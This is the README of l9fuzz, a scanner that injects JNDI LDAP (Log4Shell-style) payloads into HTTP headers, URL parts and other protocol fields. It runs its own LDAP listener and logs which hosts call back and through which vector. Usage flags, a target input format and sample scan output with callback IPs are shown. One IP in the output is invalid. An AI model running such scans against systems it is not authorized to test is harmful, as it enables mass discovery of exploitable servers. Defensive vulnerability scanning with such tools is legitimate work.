# l9fuzz

Fuzzes various protocols with JNDI LDAP payloads and listen for ping backs

## Features

- Low CPU/Memory footprint
- Integrated LDAP server
- Trace orignal source and vector
- Gets a direct IP and not a DNS resolver
- Use of templating with multiple tokens

## Usage

```
Usage: l9fuzz scan --listen-address=STRING --input-file=INPUT-FILE

Scans url for JNDI

Flags:
  -h, --help                       Show context-sensitive help.

      --timeout=2s
      --wait=1m
  -l, --listen-address=STRING      Listen address (ip:port)
  -i, --input-file=INPUT-FILE      Input file, - for STDIN
  -o, --output-file=OUTPUT-FILE    Output file
  -L, --ldap-debug=LDAP-DEBUG      LDAP server debug log file
  -m, --max-connections=100        Max connections
  -q, --quiet                      No progress bar
  -k, --psk="no-payload-check"     Payload sign key
  -t, --template=STRING            Bypasses protocols and use TCP template (stateless)

```

## Input file structure

```
http://12.44.55.66:8000/test
ssh://34.54.33.22:22
ssh://32.54.33.32:22
ssh://34.54.33.25:2222
```

## Output

```
$ ./l9fuzz scan -i - -m 400 -l 167.71.13.196:45432 
Started server at 167.71.13.196:45432
[ldap-reply] From: 14.201.105.110:51428 | Source: https://24.201.106.150:443 | Vector: http-header-x-forwarded-for | Delay: 1.849171982s
[ldap-reply] From: 14.201.105.110:51426 | Source: https://24.201.106.150:443 | Vector: http-url-path | Delay: 1.850494525s
[ldap-reply] From: 257.130.120.178:55897 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.506910982s
[ldap-reply] From: 257.130.120.178:10247 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.537421598s
[ldap-reply] From: 257.130.120.178:3467 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.54305658s
[ldap-reply] From: 257.130.120.178:29311 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.577900357s
[ldap-reply] From: 257.130.120.178:45846 | Source: http://45.199.107.194:80 | Vector: http-url-query-value | Delay: 14.764612109s
$ ./l9fuzz scan -t templates/http.txt -i source.txt -l 127.0.0.1:4555
```